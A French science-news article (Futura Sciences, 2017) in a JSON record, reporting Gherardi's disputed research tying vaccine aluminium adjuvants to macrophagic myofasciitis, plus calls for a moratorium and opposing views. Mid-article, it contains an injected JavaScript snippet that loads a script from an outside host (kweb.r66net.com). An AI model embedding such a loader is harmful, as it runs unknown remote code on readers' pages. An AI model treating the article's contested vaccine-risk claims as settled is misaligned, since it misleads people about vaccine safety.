{"title": "Sels d’aluminium dans les vaccins : faut-il s’en inquiéter ? (MAJ)", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "22/09/2017", "content": "En mars 2017, un rapport du conseil scientifique de l'ANSM (agence nationale de sécurité du médicament et des produits de santé) demandait d'approfondir la question de l'aluminium dans les vaccins. Ce rapport resté confidentiel refait surface aujourd'hui suite à des révélations dans  Le Parisien . Les  vaccins  contiennent des adjuvants qui servent à stimuler la production d'anticorps par l'organisme. Des sels d' aluminium  sont souvent présents dans ces adjuvants. Mais, depuis plusieurs années, la question de la sécurité de ces adjuvants est posée. C'est pourquoi l'ANSM a confié à Romain Gherardi, chef de service à l'hôpital Henri-Mondor (Créteil), une étude sur eux. Le professeur Gherardi a déjà alerté l'opinion publique sur les risques liés à l'aluminium dans les vaccins (voir ci-dessous). D'après lui, l'aluminium pourrait favoriser l'apparition d'une maladie, la  myofasciite à macrophages . Cette maladie se manifeste par des douleurs, de la fatigue et des troubles de la cognition.  Ce nouveau rapport, que  Le Parisien  s'est procuré, met en évidence l'existence d'une prédisposition chez certaines personnes qui développent cette maladie : sept gènes seraient surreprésentés chez les malades. Dans son rapport, l'ANSM préconisait d'étudier cette question de plus près :  « Des approfondissements sont nécessaires ».  Mais le problème du financement des études complémentaires ne semble pas réglé...  Pour en savoir plus Article de Paris-AFP paru le 15 novembre 2012 Des scientifiques affirment que les sels d'aluminium qui entrent dans la composition des vaccins pourraient avoir des effets néfastes pour la santé. De plus en plus d'études semblent montrer que le  métal  ne se dissoudrait pas comme on le pensait dans l'organisme mais qu'il s'accumulerait dans le  système nerveux central , causant une  maladie rare  appelée myofasciite à  macrophages . Des chercheurs ont appelé lundi 12 novembre à la poursuite des recherches sur la nocivité des sels d' aluminium  employés comme adjuvants dans la grande majorité des vaccins. Technique utilisée depuis des années, l'ajout d'une très petite dose d'aluminium dans les  vaccins  a pour rôle de stimuler la  réaction immunitaire . Mais alors qu'on pensait que l'aluminium se dissolvait spontanément dans les tissus et n'avait pas d'effet toxique, des études commencent à démontrer le contraire. « Les études expérimentales ont montré qu'une partie de l'aluminium injecté dans le muscle circule dans l'organisme et est capable de gagner en faible quantité le système nerveux central où il va s'accumuler » , a indiqué Romain Gherardi, un spécialiste des maladies neuromusculaires à l' hôpital Henri Mondor  de Créteil, au cours d'une conférence de presse.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des vaccins qui causent des myofasciites à macrophages ? Les travaux menés depuis la fin des années 1990 par Romain Gherardi ont permis d'identifier une nouvelle  pathologie , la myofasciite à macrophages, une  inflammation  grave des muscles qui se traduit par des douleurs musculaires et articulaires et une forte fatigue, chez des personnes génétiquement prédisposées. Les  symptômes , étudiés chez 585 adultes, apparaissent en moyenne 11 mois après l'inoculation du  vaccin , selon Romain Gherardi. Il estime qu'ils pourraient toucher jusqu'à 5 % de la population, alors même que le nombre de  vaccins recommandés  ne cesse d'augmenter, avec près de 200 produits en développement. Dans le cas de la myofasciite à macrophages, dont on suspecte les hydroxydes d'aluminium d'être à l'origine, les macrophages, ces cellules du système immunitaire à l'image, s'infiltrent dans le tissu musculaire alors qu'elles n'ont pas à y être. Cela entraîne fatigue, fièvre ou troubles neurologiques. © Obli, Wikipédia, cc by sa 2.0                               Mais l'Agence nationale de sécurité du médicament et des produits de santé ( ANSM ) a annoncé le mois dernier qu'elle ne financerait pas la poursuite de ses travaux sur les adjuvants à l'aluminium, suscitant notamment une vive émotion auprès de l'association de malades atteints de myofasciite à macrophages ( E3M ). Les recherches de Romain Gherardi ne font pas l'unanimité. Certains experts relèvent qu'aucune relation de cause à effet n'a encore été démontrée, d'autres considèrent que les soupçons qui planent sur les sels d' aluminium  sont suffisamment graves. Un moratoire contre les vaccins aux sels d’aluminium ? «  Il y a un manque de connaissance sur l'aluminium   » , a reconnu au cours de la conférence de presse Christopher Exley, un biochimiste britannique qui travaille sur l'aluminium depuis plus de 20 ans. On ne sait pas aujourd'hui, souligne-t-il, ce que peut provoquer  «   une exposition lente et consistante à l'aluminium pendant des années   »  et  «  on peut se demander   »  si des  maladies neurologiques  auto-immunes comme la  sclérose en plaques  ne seraient pas, elles aussi, liées à l'aluminium. En attendant des recherches plus poussées, la députée européenne Michèle Rivasi (EELV) a réclamé un  moratoire  sur tous les  vaccins  contenant de l'aluminium, comme l'avait déjà fait en mars dernier un groupe d'études de l'Assemblée nationale, en  application  du  principe de précaution . L'Académie nationale de médecine avait reconnu en juin que de l'aluminium pouvait pénétrer dans le  cerveau  mais s'était déclarée hostile à tout moratoire, estimant que celui-ci rendrait impossible la majorité des  vaccinations  alors que des solutions de rechange ne pourraient être prêtes que dans 5 ou 10 ans. André Cicolella, président du Réseau environnent santé (RES), a dénoncé lundi la  «  position obscurantiste  »  des autorités sanitaires qui tendent à  «   marginaliser les experts  » . «  Tant que les agences gouvernementales ne convaincront pas la population que tout est mis en œuvre pour explorer toutes les pistes, tous les signaux d'alarme, la population votera avec ses pieds et ira de moins en moins se faire  vacciner  »  a regretté Romain Gherardi. La coqueluche, une maladie encore trop souvent mortelle                       La coqueluche fait partie des maladies les plus difficiles à éliminer. Elle peut devenir mortelle dans certains cas, si elle infecte des personnes fragiles comme les nourrissons et les séniors. L’Institut Pasteur travaille donc au quotidien pour trouver des solutions qui enraieraient la maladie. Nicole Guiso, responsable du Centre national de référence de la coqueluche et autres bordetelloses, nous en parle au cours de cette interview.                                       ", "theme": "sante"}